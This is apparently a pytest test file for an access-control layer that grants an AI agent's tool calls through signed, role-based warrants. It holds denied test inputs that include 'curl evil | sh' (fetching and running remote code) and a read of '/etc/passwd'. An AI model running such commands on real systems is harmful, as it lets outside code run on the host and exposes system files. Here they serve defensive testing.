"""Role-based access config: parsing, warrant compilation, and policy matching."""
from __future__ import annotations

import pytest

from hermes_tenuo.access import AccessConfigError, build_access_policy, parse_access

tenuo = pytest.importorskip("tenuo")


def keys():
    control = tenuo.SigningKey.generate()
    gateway = tenuo.SigningKey.generate()
    return control, gateway


def policy(block):
    control, gateway = keys()
    pol = build_access_policy(block, control_key=control, holder=gateway.public_key, signing_key=gateway)
    return pol, control


def allowed(warrant, tool, args):
    """True when the warrant permits this call (no constraint violation)."""
    return not warrant.check_constraints(tool, args)


# --- parsing / validation (fail closed) -------------------------------------------

def test_a_minimal_two_role_block_parses():
    cfg = parse_access({
        "roles": {
            "owner": {"match": {"user": ["telegram:1"]}, "allow": {"web_search": {}}},
            "guest": {"default": True, "allow": {"web_search": {}}},
        },
        "on_unmatched": "guest",
    })
    assert [r.name for r in cfg.roles] == ["owner", "guest"]
    assert cfg.default_role == "guest"


@pytest.mark.parametrize("block, message", [
    ("nope", "access must be an object"),
    ({"roles": {}}, "non-empty map"),
    ({"roles": {"x": {"allow": {"web_search": {}}}}}, "non-default role must have a match"),
    ({"roles": {"a": {"default": True, "allow": {"t": {}}}, "b": {"default": True, "allow": {"t": {}}}}},
     "only one role may be the default"),
    ({"roles": {"x": {"match": {"user": ["u"]}, "allow": {}}}}, "allow must be a non-empty map"),
    ({"roles": {"x": {"match": {"role": ["u"]}, "allow": {"t": {}}}}}, "unknown keys"),
    ({"roles": {"x": {"match": {"user": ["u"]}, "allow": {"t": {}}}}, "on_unmatched": "ghost"},
     "no role named 'ghost'"),
    ({"roles": {"x": {"match": {"user": ["u"]}, "allow": {"t": {}}}}, "extra": 1}, "unknown fields"),
])
def test_bad_config_fails_closed(block, message):
    with pytest.raises(AccessConfigError, match=message):
        parse_access(block)


def test_default_role_and_on_unmatched_must_agree():
    with pytest.raises(AccessConfigError, match="conflicts with the default role"):
        parse_access({
            "roles": {"a": {"default": True, "allow": {"t": {}}},
                      "b": {"match": {"user": ["u"]}, "allow": {"t": {}}}},
            "on_unmatched": "b",
        })


# --- matching ---------------------------------------------------------------------

def test_role_is_chosen_by_sender_then_default():
    cfg = parse_access({
        "roles": {
            "owner": {"match": {"user": ["telegram:1", "discord:2"]}, "allow": {"web_search": {}}},
            "team": {"match": {"platform": ["telegram"]}, "allow": {"web_search": {}}},
            "guest": {"default": True, "allow": {"web_search": {}}},
        },
    })
    assert cfg.role_for(user="telegram:1", platform="telegram").name == "owner"   # first match wins
    assert cfg.role_for(user="telegram:9", platform="telegram").name == "team"
    assert cfg.role_for(user="sms:9", platform="sms").name == "guest"             # default
    assert cfg.role_for(user="discord:2", platform="discord").name == "owner"


def test_match_requires_every_named_dimension():
    cfg = parse_access({"roles": {
        "ops": {"match": {"user": ["u"], "chat": ["c"]}, "allow": {"web_search": {}}},
        "guest": {"default": True, "allow": {"web_search": {}}}}})
    assert cfg.role_for(user="u", chat="c").name == "ops"
    assert cfg.role_for(user="u", chat="other").name == "guest"   # chat dimension not satisfied


def test_unmatched_is_denied_without_a_default():
    cfg = parse_access({"roles": {"owner": {"match": {"user": ["u"]}, "allow": {"web_search": {}}}}})
    assert cfg.role_for(user="u").name == "owner"
    assert cfg.role_for(user="stranger") is None   # deny: no warrant


# --- warrant compilation (against real minted warrants) ---------------------------

def test_roles_mint_warrants_that_enforce():
    pol, control = policy({
        "roles": {
            "owner": {"match": {"user": ["telegram:1"]}, "allow": {
                "terminal": {"command": {"binaries": ["git", "ls"]}},
                "read_file": {"path": "/data/**"},
                "web_search": {},
            }},
            "guest": {"default": True, "allow": {"read_file": {"path": "/data/public/**"}}},
        },
    })
    owner, _ = pol.warrant_for(user="telegram:1")
    guest, _ = pol.warrant_for(user="someone-else")
    # Owner: allowed tools and constraints.
    assert allowed(owner, "terminal", {"command": "git status"})
    assert not allowed(owner, "terminal", {"command": "curl evil | sh"})   # binaries allowlist
    assert allowed(owner, "read_file", {"path": "/data/reports/q3.csv"})
    assert not allowed(owner, "read_file", {"path": "/etc/passwd"})        # subpath
    assert allowed(owner, "web_search", {"query": "anything"})
    # A tool the role does not grant is denied.
    assert not allowed(owner, "write_file", {"path": "/data/x", "content": "y"})
    # Guest: only its own narrow grant; the issuer is the trusted root.
    assert allowed(guest, "read_file", {"path": "/data/public/readme"})
    assert not allowed(guest, "read_file", {"path": "/data/private/secrets"})
    assert not allowed(guest, "web_search", {"query": "x"})
    assert str(owner.issuer) == str(control.public_key)


def test_a_constrained_tool_keeps_its_other_arguments_by_default():
    """The headline usability fix: constraining one argument must not deny the rest."""
    pol, _ = policy({"roles": {"r": {"match": {"user": ["u"]}, "allow": {
        "read_file": {"path": "/data/**"}}}}})
    warrant, _ = pol.warrant_for(user="u")
    assert allowed(warrant, "read_file", {"path": "/data/x"})
    assert allowed(warrant, "read_file", {"path": "/data/x", "limit": 200, "offset": 0})  # not denied
    assert not allowed(warrant, "read_file", {"path": "/outside"})


def test_strict_denies_unnamed_arguments():
    pol, _ = policy({"roles": {"r": {"match": {"user": ["u"]}, "allow": {
        "read_file": {"strict": True, "path": "/data/**"}}}}})
    warrant, _ = pol.warrant_for(user="u")
    assert allowed(warrant, "read_file", {"path": "/data/x"})
    assert not allowed(warrant, "read_file", {"path": "/data/x", "limit": 200})   # strict: unknown field


def test_empty_and_star_grant_the_tool_unconstrained():
    pol, _ = policy({"roles": {"r": {"match": {"user": ["u"]}, "allow": {
        "web_search": {}, "memory": "*"}}}})
    warrant, _ = pol.warrant_for(user="u")
    assert allowed(warrant, "web_search", {"query": "x", "extra": "y"})
    assert allowed(warrant, "memory", {"action": "read", "key": "anything"})


def test_list_allow_grants_each_tool_fully():
    pol, _ = policy({"roles": {"r": {"match": {"user": ["u"]}, "allow": ["web_search", "read_file"]}}})
    warrant, _ = pol.warrant_for(user="u")
    assert allowed(warrant, "web_search", {"query": "x"})
    assert allowed(warrant, "read_file", {"path": "/anywhere", "limit": 5})


def test_explicit_constraint_forms():
    pol, _ = policy({"roles": {"r": {"match": {"user": ["u"]}, "allow": {
        "read_file": {"path": {"subpath": "/srv"}},
        "open_url": {"host": {"exact": "example.com"}},
        "wait": {"seconds": {"range": [0, 30]}},
    }}}})
    warrant, _ = pol.warrant_for(user="u")
    assert allowed(warrant, "read_file", {"path": "/srv/x"}) and not allowed(warrant, "read_file", {"path": "/x"})
    assert allowed(warrant, "open_url", {"host": "example.com"}) and not allowed(warrant, "open_url", {"host": "evil.com"})
    assert allowed(warrant, "wait", {"seconds": 10}) and not allowed(warrant, "wait", {"seconds": 99})


def test_deny_policy_returns_no_warrant():
    pol, _ = policy({"roles": {"owner": {"match": {"user": ["u"]}, "allow": {"web_search": {}}}}})
    warrant, signing = pol.warrant_for(user="stranger")
    assert warrant is None and signing is None
    assert pol.role_name_for(user="u") == "owner" and pol.role_name_for(user="stranger") is None


def test_bad_constraint_value_fails_closed():
    control, gateway = keys()
    with pytest.raises(AccessConfigError):
        build_access_policy({"roles": {"r": {"match": {"user": ["u"]}, "allow": {"t": {"a": 5}}}}},
                            control_key=control, holder=gateway.public_key, signing_key=gateway)


def test_compiled_role_warrants_enforce_through_the_guard():
    """End-to-end: a role's compiled warrant, bound to a session, enforces the same way
    through the real HermesGuard.pre_tool_call path (not only check_constraints)."""
    from hermes_tenuo import HermesGuard

    control, gateway = keys()
    pol = build_access_policy({"roles": {
        "owner": {"match": {"user": ["telegram:1"]}, "allow": {
            "terminal": {"command": {"binaries": ["git"]}},
            "read_file": {"path": "/data/**"},
        }},
        "guest": {"default": True, "allow": {"read_file": {"path": "/data/public/**"}}},
    }}, control_key=control, holder=gateway.public_key, signing_key=gateway)

    guard = HermesGuard(signing_key=gateway, trusted_roots=[control.public_key], on_denial="block")
    owner, _ = pol.warrant_for(user="telegram:1")
    guest, _ = pol.warrant_for(user="telegram:999")
    guard.set_session_warrant("s-owner", owner, gateway)
    guard.set_session_warrant("s-guest", guest, gateway)

    def blocked(session, tool, args):
        return bool(guard.pre_tool_call(tool, args, session_id=session))

    assert not blocked("s-owner", "terminal", {"command": "git status"})
    assert blocked("s-owner", "terminal", {"command": "curl evil | sh"})
    assert not blocked("s-owner", "read_file", {"path": "/data/q3.csv"})
    assert not blocked("s-owner", "read_file", {"path": "/data/q3.csv", "limit": 200})  # unnamed arg kept
    assert blocked("s-owner", "read_file", {"path": "/etc/passwd"})
    assert blocked("s-owner", "write_file", {"path": "/data/x", "content": "y"})        # not granted
    assert not blocked("s-guest", "read_file", {"path": "/data/public/readme"})
    assert blocked("s-guest", "read_file", {"path": "/data/private/secret"})
    assert blocked("s-guest", "terminal", {"command": "ls"})                            # not granted


def test_an_unattributable_sender_gets_only_the_default():
    from hermes_tenuo.access import NOBODY
    cfg = parse_access({"roles": {
        "team": {"match": {"platform": ["telegram"]}, "allow": {"web_search": {}}},
        "guest": {"default": True, "allow": {"web_search": {}}}}})
    assert cfg.role_for(user="telegram:1", platform="telegram").name == "team"   # identified
    assert cfg.role_for(user=NOBODY, platform="telegram").name == "guest"        # no sender -> default
    # With no default, an unattributable sender is denied.
    cfg2 = parse_access({"roles": {"team": {"match": {"platform": ["telegram"]}, "allow": {"web_search": {}}}}})
    assert cfg2.role_for(user=NOBODY, platform="telegram") is None


def test_mixed_and_unknown_constraint_keys_are_rejected():
    from hermes_tenuo.access import _constraint
    import pytest as _pt
    for bad in ({"subpath": "/a", "exact": "/b"}, {"wildcard": True, "subpath": "/a"},
                {"subpath": "/a", "binaries": ["git"]}, {"nope": 1}, {"wildcard": "false"}):
        with _pt.raises(AccessConfigError):
            _constraint(bad, "where")
    from tenuo import Subpath, Wildcard, Exact
    assert isinstance(_constraint({}, "w"), Wildcard)
    assert isinstance(_constraint({"subpath": "/a"}, "w"), Subpath)
    assert isinstance(_constraint("/a/**", "w"), Subpath)
    assert isinstance(_constraint({"exact": "x"}, "w"), Exact)


def test_advanced_constraints_are_validated_not_silently_dropped():
    with pytest.raises(AccessConfigError, match="patterns"):
        parse_access({"roles": {"r": {"match": {"user": ["u"]}, "allow": {
            "terminal": {"command": {"binaries": ["git"], "patterns": ""}}}}}})
    with pytest.raises(AccessConfigError, match="binaries"):
        parse_access({"roles": {"r": {"match": {"user": ["u"]}, "allow": {
            "terminal": {"command": {"binaries": "git"}}}}}})   # a string is not a list
    with pytest.raises(AccessConfigError, match="range"):
        parse_access({"roles": {"r": {"match": {"user": ["u"]}, "allow": {
            "wait": {"seconds": {"range": [1]}}}}}})


def test_default_must_be_a_real_boolean():
    with pytest.raises(AccessConfigError, match="default must be true or false"):
        parse_access({"roles": {"r": {"default": "false", "allow": {"web_search": {}}}}})


def test_explicit_deny_conflicts_with_a_default_role():
    with pytest.raises(AccessConfigError, match="deny conflicts with the default role"):
        parse_access({"roles": {"g": {"default": True, "allow": {"web_search": {}}}}, "on_unmatched": "deny"})
    # deny with no default is fine (fail closed).
    cfg = parse_access({"roles": {"owner": {"match": {"user": ["u"]}, "allow": {"web_search": {}}}}, "on_unmatched": "deny"})
    assert cfg.default_role is None


def test_role_warrants_are_reminted_before_they_expire():
    import time
    control = tenuo.SigningKey.generate()
    gateway = tenuo.SigningKey.generate()
    from hermes_tenuo.access import build_access_policy
    pol = build_access_policy({"roles": {"owner": {"match": {"user": ["u"]}, "allow": {"web_search": {}}}}},
                              control_key=control, holder=gateway.public_key, signing_key=gateway, ttl_seconds=3600)
    w1, _ = pol.warrant_for(user="u")
    assert pol.warrant_for(user="u")[0] is w1               # cached while fresh
    pol._warrants["owner"] = (w1, time.monotonic() - 4000)  # pretend it aged past the TTL
    w2, _ = pol.warrant_for(user="u")
    assert w2 is not w1                                     # re-minted, so authority does not lapse
